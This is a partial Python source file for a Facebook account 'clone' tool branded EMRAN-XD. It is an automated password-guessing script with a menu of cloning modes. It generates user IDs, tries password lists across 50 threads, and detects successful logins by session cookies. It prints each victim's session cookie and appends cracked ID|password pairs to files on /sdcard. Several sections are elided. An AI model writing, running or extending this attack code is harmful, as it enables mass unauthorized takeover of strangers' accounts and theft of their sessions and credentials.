...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[EMRAN-XD')
...
#EMRAN_NAME=input(f'\033[1;92m[\033[1;31m\033[1;92m]\033[0;92m YOUR NAME :\x1b[1;96m ')
#--------------------[ BAGIAN-MASUK ]--------------#
...
def menu():
	...
	_EMRAN_(f'\033[1;92m[\033[1;34m1\033[38;5;46m]𝐄𝐇𝐂 𝐖𝐎𝐑𝐊_____𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐄 \x1b[38;5;196m𝐖𝐎𝐑𝐊𝐈𝐍𝐆')
	_EMRAN_(f'\033[1;92m[\033[1;92m2\033[38;5;46m[𝐄𝐇𝐂 𝐖𝐎𝐑𝐊______𝐑𝐀𝐍𝐃𝐎𝐌  𝐂𝐋𝐎𝐍𝐄 \x1b[38;5;196m𝐖𝐎𝐑𝐊𝐈𝐍𝐆')
	_EMRAN_(f'\033[1;92m[\033[1;92m3\033[38;5;46m[𝐄𝐇𝐂 𝐖𝐎𝐑𝐊_______𝐄𝐌𝐀𝐈𝐋 𝐂𝐋𝐎𝐍𝐄 \x1b[38;5;196m𝐖𝐎𝐑𝐊𝐈𝐍𝐆')
	_EMRAN_(f'[\033[1;92m\033[1;34m4\033[38;5;46m]𝐄𝐌𝐑𝐀𝐍 𝐂𝐘𝐁𝐄𝐑____\x1b[38;5;196m𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐌𝐄')
	_EMRAN_(f'\033[1;92m[\033[1;34m0\033[38;5;46m]𝐄𝐗𝐈𝐓')
	_____EMRAN_____ = input('\033[1;92m\033[38;5;46m𝐂𝐇𝐎𝐎𝐒𝐄 :\x1b[1;92m ')
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(EMRAN_NAME))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#open('/sdcard/'+EMRAN-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
...
def Y2():
    ...
    with ThreadPool(max_workers=50) as EMRAN:
        ...
        for love in user:
            ...
            uid = code+love
            EMRAN.submit(alamin,uid,pwv,tl)
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mEMRAN-EHC\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/EMRAN-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[EMRAN.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/EMRAN-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
    ...
    try:
        for ps in pwv:
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mEMRAN-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/EMRAN-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
